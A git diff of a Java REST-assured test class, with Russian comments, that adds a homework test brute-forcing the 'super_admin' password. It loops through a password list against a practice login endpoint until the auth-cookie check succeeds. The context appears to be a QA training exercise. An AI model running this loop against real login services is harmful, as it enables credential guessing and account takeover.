@@ -6,7 +6,10 @@ import io.restassured.RestAssured;
 import io.restassured.path.json.JsonPath;
 import io.restassured.response.Response;
 import org.junit.jupiter.api.Test;
-import java.util.List;
+
+import java.io.*;
+import java.util.*;
+
 import static io.qameta.allure.Allure.step;
 import static io.restassured.RestAssured.given;
 import static org.hamcrest.core.IsEqual.equalTo;
@@ -102,7 +105,49 @@ public class JsonHomeWork {
                 .extract().response()
                 .jsonPath();
     }
+    @Test
+    @Description("Подбор пароля")
+    public void teste() throws FileNotFoundException {
+        String auth;
+        int count = 0;
+        String patch ="src/test/java/api/trash/pass";
+
+        step("файл раскидаем в массив");
+        File file = new File(patch);
+        Scanner scanner = new Scanner(file);
+        String line = scanner.nextLine();
+        String[] passwords = line.split(" ");
+        scanner.close();
+
+        step("Вытаскиваем куки и подставляем во второй запрос, пока не авторизуемся");
+        do {
+            Map<String, String> data = new HashMap<>();
+            data.put("login", "super_admin");
+            data.put("password", passwords[count]);
+
+            Response response = RestAssured
+                    .given()
+                    .body(data)
+                    .when()
+                    .post(URL + "/ajax/api/get_secret_password_homework")
+                    .andReturn();
+
+            String responseCookie = response.getCookie("auth_cookie");
+
+            auth = given()
+                    .cookie("auth_cookie", responseCookie)
+                    .when()
+                    .post(URL + "/ajax/api/check_auth_cookie")
+                    .then().extract().response().body().asString();
+
+            count++;
+        } while (!Objects.equals(auth, "You are authorized"));
+
+        System.out.println(auth);
+        System.out.println(passwords[count-1]);
+    }
 }
+
 
 
 
